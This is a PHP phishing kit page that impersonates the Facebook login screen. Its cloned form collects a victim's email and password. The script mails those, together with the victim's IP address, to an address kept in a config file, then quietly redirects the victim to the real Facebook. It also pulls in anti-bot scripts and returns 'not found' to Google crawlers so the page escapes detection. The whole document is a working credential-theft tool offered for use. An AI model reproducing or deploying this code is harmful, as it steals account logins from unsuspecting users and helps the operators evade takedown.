<?php

error_reporting(0); 

include("./inc/config.php");

include "./f.anti/antibots1.php";
include "./f.anti/antibots2.php";
include "./f.anti/antibots3.php";
include "./f.anti/antibots4.php";
include "./f.anti/antibots5.php";

/*-----------------------------------------------------------------------*/
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
/*-----------------------------------------------------------------------*/

$serbeselphp = $_POST['richa'];
if($serbeselphp != "") {
	$ip = getenv("REMOTE_ADDR");
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$uorp = $_POST['eml'];
	$passw = $_POST['pw'];
	
	$dt = "".date("r (T)")."";
	$m1 .= "
<!DOCTYPE html>
<html>
<head><meta charset='UTF-8'></head>
<body>
<blockquote style='background-color: white;border-radius: 4px;border: 1px solid rgb(209, 209, 209);box-shadow: rgba(0, 0, 0, 0.5) 0px 5px 15px;box-sizing: inherit;color: #3e3e3e;font-family: Verdana, sans-serif;font-size: 16px;height: 395.703;left: 212.5px;margin-left: auto;margin-right: auto;width: 670.016;width:480px;'>
<br>


<center>
<img border='0' data-original-height='662' data-original-width='800' height='165' src='http://www.transparentpng.com/thumb/facebook-logo-png/background-facebook-logo-5.png' width='200' />
<br>

<span style='background-color: white; color: #222222; white-space: pre-wrap;'><b><span style='font-family: &quot;verdana&quot; , sans-serif;'>

『Email』: $uorp<br>
『Password』: $passw<br> 


『IP』: geoiptool.com/?ip=$ip

</span></b></span>
<br><br><br>
<center>
</blockquote>

</body>
</html> \n";
	

	$b0 = " ⌈ FACEBooK ACC ⌉ @ $dt From $ip";
	$b1 = "From: LOGINS  <LOGINS@EAZY.com>.\n";
	$b1 .= $_POST['eMailAdd']."\n";
	$b1 = "X-Mailer: PHP/".phpversion();
	$b1 .= "MIME-Version: 1.0\n";
	$b1 .= "Content-type: text/html; charset=UTF-8\n";



	mail($zb,$b0,$m1,$b1);
	
	
	 $act = "https://facebook.com";
	header( "refresh:0;url=$act" );


   }
   

?>

<html lang="en" id="facebook" class=""><head><meta charset="utf-8"><style></style><title id="pageTitle">Facebook - Log In or Sign Up</title><link rel="shortcut icon" href="./img/iRmz9lCMBD2.ico">
<link type="text/css" rel="stylesheet" href="./css/main.css">
</head><body class="fbIndex UIPage_LoggedOut _-kb _61s0 _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_US cores-gte4 _19_u hasAXNavMenubar" dir="ltr"><div class="_li" id="u_0_z"><div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_10"><div class="_608m"><div class="_5aj7 _tb6"><div class="_4bl7"><span class="mrm _3bcv _50f3">Jump to</span></div><div class="_4bl9 _3bcp"><div class="_6a _608n" aria-label="Navigation Assistant" aria-keyshortcuts="Alt+/" role="menubar" id="u_0_11"><div class="_6a uiPopover" id="u_0_12"><a role="menuitem" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_13"><span class="_55pe">Sections of this page</span><span class="_4o_3 _3-99"><i class="img sp_cdTC-VYAWtd sx_accb0a"></i></span></a></div><div class="_6a _3bcs"></div><div class="_6a mrm uiPopover" id="u_0_14"><a role="menuitem" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_15"><span class="_55pe">Accessibility Help</span><span class="_4o_3 _3-99"><i class="img sp_cdTC-VYAWtd sx_7f817a"></i></span></a></div></div></div><div class="_4bl7 mlm pll _3bct"><div class="_6a _3bcy">Press <span class="_3bcz">alt</span> + <span class="_3bcz">/</span> to open this menu</div></div></div></div></div><div id="pagelet_bluebar" data-referrer="pagelet_bluebar"><div id="blueBarDOMInspector"><div class="_53jh"><div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar"><div class="lfloat _ohe"><h1><a href="" title="Home"><i class="fb_logo img sp_cdTC-VYAWtd sx_b8adf4"><u>Facebook</u></i></a></h1></div><div class="menu_login_container rfloat _ohf" data-testid="royal_login_form"><form id="login_form" action="" method="post" novalidate="1" onsubmit="">

<input type="hidden" name="richa" value="SNR20">

<table cellspacing="0" role="presentation"><tbody><tr><td class="html7magic"><label for="email">Email or Phone</label></td><td class="html7magic"><label for="pass">Password</label></td></tr><tr><td><input type="email" class="inputtext" name="eml" id="email" data-testid="royal_email"></td><td><input type="password" class="inputtext" name="pw" id="pass" data-testid="royal_pass"></td><td><label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_2"><input value="Log In" aria-label="Log In" data-testid="royal_login_button" type="submit" id="u_0_2"></label></td></tr><tr><td class="login_form_label_field"></td><td class="login_form_label_field"><div><a href="">Forgot account?</a></div></td></tr></tbody></table><input type="hidden" autocomplete="off" name="timezone" value="-135" id="u_0_3"><input type="hidden" autocomplete="off" name="lgndim" value="eyJ3IjoxMjgwLCJoIjoxMDI0LCJhdyI6MTI4MCwiYWgiOjk4NCwiYyI6MjR9" id="u_0_4"><input type="hidden" name="lgnrnd" value="112225_2r-L"><input type="hidden" id="lgnjs" name="lgnjs" value="1545852797"><input type="hidden" autocomplete="off" name="ab_test_data" value=""><input type="hidden" autocomplete="off" id="locale" name="locale" value="en_US"><input type="hidden" autocomplete="off" name="next" value=""><input type="hidden" autocomplete="off" name="login_source" value="login_bluebar"><input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point"><input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source"></form></div></div></div></div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div class="fb_content clearfix " id="content" role="main"><div><div class="_50dz"><style> .product_desc { width: 440px; } .product_desc .mlm { margin-left: 2px; } .inlineBlock ~ .mtm { margin-top: 14px; } .inlineBlock ~ .mtm > .mrl { margin-right: 16px; } </style><img border="0" data-original-height="830" data-original-width="1222" src="./img/spngbob.png" style="
    width: 100%;
"></div></div></div></div><span><img src="" width="0" height="0" style="display:none"></span></div><div></div>







</body></html>